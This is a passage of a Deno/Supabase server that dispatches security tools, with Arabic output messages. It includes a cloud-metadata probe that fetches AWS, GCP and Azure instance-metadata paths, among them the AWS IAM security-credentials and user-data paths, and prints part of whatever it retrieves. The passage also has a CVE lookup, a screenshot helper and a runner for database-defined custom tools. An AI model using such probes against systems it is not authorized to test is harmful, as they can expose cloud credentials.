    { name: "AWS Metadata", path: "/latest/meta-data/" },
    { name: "GCP Metadata", path: "/computeMetadata/v1/" },
    { name: "Azure Metadata", path: "/metadata/instance?api-version=2021-02-01" },
    { name: "AWS Credentials", path: "/latest/meta-data/iam/security-credentials/" },
    { name: "AWS User Data", path: "/latest/user-data/" },
  ];
  const base = url.replace(/\/+$/, "");
  for (const ep of endpoints) {
    try {
      const resp = await fetch(`${base}${ep.path}`, { headers: { "Metadata-Flavor": "Google", "Metadata": "true" }, redirect: "manual" });
      const status = resp.status;
      if (status === 200) {
        const text = await resp.text();
        results.push(`🔴 ${ep.name}: متاح! (${status})`);
        results.push(`  المحتوى: ${text.slice(0, 200)}`);
      } else {
        results.push(`✅ ${ep.name}: محمي (${status})`);
        try { await resp.text(); } catch {}
      }
    } catch {
      results.push(`✅ ${ep.name}: غير متاح`);
    }
  }
  return results.join("\n");
};

tools.cve_search = async (args) => {
  const { keyword } = args;
  if (!keyword) return "❌ مطلوب: keyword";
  const results: string[] = [`🔍 بحث CVE: ${keyword}\n${"─".repeat(40)}`];
  try {
    const resp = await fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=10`);
    if (resp.ok) {
      const data = await resp.json();
      const total = data.totalResults || 0;
      results.push(`📊 إجمالي النتائج: ${total}\n`);
      const vulns = data.vulnerabilities || [];
      for (const v of vulns.slice(0, 10)) {
        const cve = v.cve;
        const id = cve.id;
        const desc = cve.descriptions?.find((d: any) => d.lang === "en")?.value || "لا يوجد وصف";
        const severity = cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseSeverity || cve.metrics?.cvssMetricV2?.[0]?.cvssData?.baseSeverity || "غير محدد";
        const score = cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore || cve.metrics?.cvssMetricV2?.[0]?.cvssData?.baseScore || "N/A";
        results.push(`🔴 ${id} (${severity} - ${score})`);
        results.push(`  ${desc.slice(0, 200)}\n`);
      }
    } else {
      results.push(`❌ فشل البحث: ${resp.status}`);
      await resp.text();
    }
  } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
  return results.join("\n");
};

tools.screenshot_site = async (args) => {
  const { url } = args;
  if (!url) return "❌ مطلوب: url";
  try {
    const screenshotUrl = `https://image.thum.io/get/width/1280/crop/720/${encodeURIComponent(url)}`;
    return `📸 لقطة شاشة لـ ${url}\n\n🔗 [عرض اللقطة](${screenshotUrl})`;
  } catch (e) {
    return `❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`;
  }
};

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
  try {
    const { tool, args, customConfig } = await req.json();
    
    // Handle custom tools (with customConfig provided)
    if (customConfig) {
      const result = await executeCustomTool(args || {}, customConfig);
      return new Response(JSON.stringify({ result }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }
    
    // Check built-in tools
    const toolName = tool?.startsWith("custom_") ? tool.replace("custom_", "") : tool;
    if (toolName && tools[toolName]) {
      const result = await tools[toolName](args || {});
      return new Response(JSON.stringify({ result }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }
    
    // Not found in built-in tools - try to find in DB as custom tool
    if (toolName) {
      try {
        const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
        const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
        const dbResp = await fetch(
          `${SUPABASE_URL}/rest/v1/custom_tools?tool_id=eq.${encodeURIComponent(toolName)}&limit=1`,
          { headers: { "apikey": SUPABASE_ANON_KEY, "Authorization": `Bearer ${SUPABASE_ANON_KEY}` } }
        );
        if (dbResp.ok) {
          const rows = await dbResp.json();
          if (rows.length > 0) {
            const row = rows[0];
            const result = await executeCustomTool(args || {}, {
              executionType: row.execution_type,
              executionConfig: row.execution_config || {},
            });
            return new Response(JSON.stringify({ result }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
          }
        }
      } catch {}
    }

    return new Response(JSON.stringify({ error: "أداة غير معروفة", available_tools: Object.keys(tools) }),
      { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  } catch (e) {
    console.error("execution error:", e);
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : "خطأ" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});
